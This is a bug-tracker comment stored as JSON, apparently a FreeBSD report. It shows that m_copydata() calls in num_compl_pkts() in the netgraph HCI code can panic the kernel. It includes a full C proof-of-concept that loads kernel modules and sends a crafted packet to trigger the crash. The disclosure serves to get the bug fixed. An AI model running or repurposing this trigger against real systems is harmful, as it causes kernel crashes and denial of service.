@@ -1,0 +1,8 @@
+{
+ "id": 1233072,
+ "bug_id": 267294,
+ "attachment_id": 0,
+ "creation_time": "2022-10-26T21:28:58Z",
+ "creator": "rtm@lcs.mit.edu",
+ "text": "The m_copydata() calls in num_compl_pkts() in ng_hci_evnt.c can also\npanic. Here's a demo program:\n\n#include \u003cstdio.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003csys/socket.h\u003e\n#include \u003csys/ioctl.h\u003e\n#include \u003cnetinet/in.h\u003e\n#include \u003csys/wait.h\u003e\n#include \u003csys/resource.h\u003e\n#include \u003carpa/inet.h\u003e\n#include \u003cassert.h\u003e\n#include \u003cctype.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003csignal.h\u003e\n#include \u003cnetgraph/ng_message.h\u003e\n#include \u003cnetgraph/ng_socket.h\u003e\n#include \u003cnetgraph.h\u003e\n\nint\nmain(){\n  setlinebuf(stdout);\n  struct rlimit r;\n  r.rlim_cur = r.rlim_max = 0;\n  setrlimit(RLIMIT_CORE, \u0026r);\n  signal(SIGPIPE, SIG_IGN);\n\n  system(\"kldload netgraph\");\n  system(\"kldload ng_hci\");\n\n  int cs = -1;\n  int ds = -1;\n  NgMkSockNode(NULL, \u0026cs, \u0026ds);\n\n  struct ngm_mkpeer mkp;\n  memset(\u0026mkp, 0, sizeof(mkp));\n  strcpy(mkp.type, \"hci\");\n  strcpy(mkp.ourhook, \"hook\");\n  strcpy(mkp.peerhook, \"drv\");\n\n  if (NgSendMsg(cs, \".:\", NGM_GENERIC_COOKIE,\n                NGM_MKPEER, \u0026mkp, sizeof(mkp)) \u003c 0) {\n    fprintf(stderr, \"netgraph mkpeer %s %s failed\\n\", mkp.type, mkp.peerhook);\n  }\n\n  char buf[128];\n  memset(buf, 0xff, sizeof(buf));\n  *(long long *)(buf + 0) ^= 0xecfb;\n  NgSendData(ds, \"hook\", (unsigned char *)buf, 116);\n}"
+}
